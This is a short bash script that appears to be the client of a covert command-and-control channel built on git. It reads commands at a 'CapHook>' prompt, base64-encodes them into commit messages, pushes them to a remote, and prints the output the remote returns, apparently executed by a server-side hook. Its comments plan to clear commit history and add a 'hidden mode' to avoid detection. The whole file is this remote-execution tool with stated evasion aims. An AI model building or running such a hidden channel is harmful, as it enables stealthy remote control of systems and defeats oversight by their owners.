#!/bin/bash

while true; do
    echo "CapHook> "
    read command
    encode=$(echo ${command} | base64)
    echo ${encode}
    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1)
    git add -A > /dev/null
    git commit -m ${encode} > /dev/null
    #This is the best I could come up with
    git push 2>&1 | tee /tmp/git
    cat /tmp/git | grep "remote: " | awk '{print $2}'
	#We could clear our commit history to be hidden
	#have a flag like -f to go hidden mode which is above
done
